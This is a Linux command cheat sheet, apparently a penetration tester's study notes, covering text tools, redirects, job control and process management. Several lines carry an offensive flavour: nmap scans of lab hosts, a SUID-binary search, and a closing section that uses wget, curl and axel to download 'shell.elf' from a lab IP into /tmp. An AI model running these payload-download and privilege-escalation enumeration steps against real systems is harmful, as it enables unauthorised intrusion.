# Basic Commands

## Common

### apropos

Search the list of man page descriptions for a possible match based on a keyword.

``` bash
apropos website
get-iab (1)          - Fetch the arp-scan IAB file from the IEEE website
get-oui (1)          - Fetch the arp-scan OUI file from the IEEE website (on Debian and Debian based systems, data is fetched from ieee-data package)
whatweb (1)          - Next generation Web scanner. Identify technologies used by websites.
```

### mkdir

``` bash
mkdir module one

mkdir "module one"

mkdir -p module/{one,two,three}
```

### Piping

``` bash
sudo ss -antlp | grep sshd
```

### sed

``` bash
echo 'Hades' | sed 's/Hades/leecybersec.com/'
```

### cut

``` bash
echo "hacking, penetration testing and bug hunting"| cut -f 2 -d " "

penetration
```
``` bash
cut -d ":" -f 1 /etc/passwd
root
daemon
bin
```

### awk

``` bash
cat /etc/passwd | awk -F ":" '{print $1, ":", $7}' | grep "sh"
```

### uniq -c

``` bash
cat list.txt | sort | uniq -c | sort -r
```

### grep

``` bash
ifconfig | grep eth0 -C 1 | grep inet | cut -f10 -d' '
grep -v "Nmap"
```

### cutycapt

``` bash
cutycapt --url=$ip --out=$ip.png
```

### Redirect

to a New File

``` bash
ls > list.txt
```

``` bash
cat list.txt
Desktop
Documents
list.txt
```

to an Existing File

``` bash
echo "Add new" >> list.txt
```

from a File

``` bash
wc -m < list.txt
```

STDERR

``` bash
find / -perm -u=s -type f 2>/dev/null
```

## Processes

### Background a process 

``` bash
┌──(Hades㉿192.168.11.130)-[0.8:10.9]~
└─$ nmap -p- 127.0.0.1 &           
[1] 1239
                                                                                                                                                                            
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-09 20:49 EST
```

### Suspend the job

``` bash
┌──(Hades㉿192.168.11.130)-[0.7:11.1]~
└─$ nmap -p- 192.168.11.131 -Pn

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-09 20:52 EST
^Z
zsh: suspended  nmap -p- 192.168.11.131 -Pn
┌──(Hades㉿192.168.11.130)-[0.7:11.4]~
└─$ bg

[1]  + continued  nmap -p- 192.168.11.131 -Pn
```

### jobs and fg

``` bash
┌──(Hades㉿192.168.11.130)-[0.7:11.1]~
└─$ jobs

[1]  + running    nmap -p- 192.168.11.131 -Pn
                                                                                                                                                                            
┌──(Hades㉿192.168.11.130)-[0.8:11.4]~
└─$ fg

[1]  + running    nmap -p- 192.168.11.131 -Pn
^C
```

### ps and kill

``` bash
ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 20:39 ?        00:00:02 /sbin/init splash
root           2       0  0 20:39 ?        00:00:00 [kthreadd]
<snip>
kali        1448    1202  0 20:56 pts/0    00:00:01 nmap -p- 192.168.11.131 -Pn
kali        1466    1202  0 20:56 pts/0    00:00:00 nmap -p- 192.168.11.132 -Pn
kali        1484    1202  0 20:57 pts/0    00:00:00 nmap -p- 192.168.11.133 -Pn
kali        1673    1202  0 20:59 pts/0    00:00:00 ps -ef
```

``` bash
ps -fC nmap
UID          PID    PPID  C STIME TTY          TIME CMD
kali        1448    1202  0 20:56 pts/0    00:00:01 nmap -p- 192.168.11.131 -Pn
kali        1466    1202  0 20:56 pts/0    00:00:00 nmap -p- 192.168.11.132 -Pn
kali        1484    1202  0 20:57 pts/0    00:00:00 nmap -p- 192.168.11.133 -Pn
```

``` bash
kill 1466                                                                                                                                                           2 ⚙
                                                                                                                                                                            
[2]  + terminated  nmap -p- 192.168.11.132 -Pn
```

## Monitoring

### tail

``` bash
udo tail -f /var/log/apache2/access.log
192.168.11.130 - - [09/Mar/2021:21:12:03 -0500] "GET / HTTP/1.1" 200 10956 "-" "curl/7.74.0"
192.168.11.130 - - [09/Mar/2021:21:12:05 -0500] "GET / HTTP/1.1" 200 10956 "-" "curl/7.74.0"
...
```

### watch

``` bash
watch -n 1 date
```

## Downloading

### wget

``` bash
wget -O /tmp/shell http://192.168.110.131/shell.elf
```

### curl

``` bash
curl -o /tmp/shell http://192.168.110.131/shell.elf
```

### axel

``` bash
axel -a -n 20 -o /tmp/shell http://192.168.110.131/shell.elf
```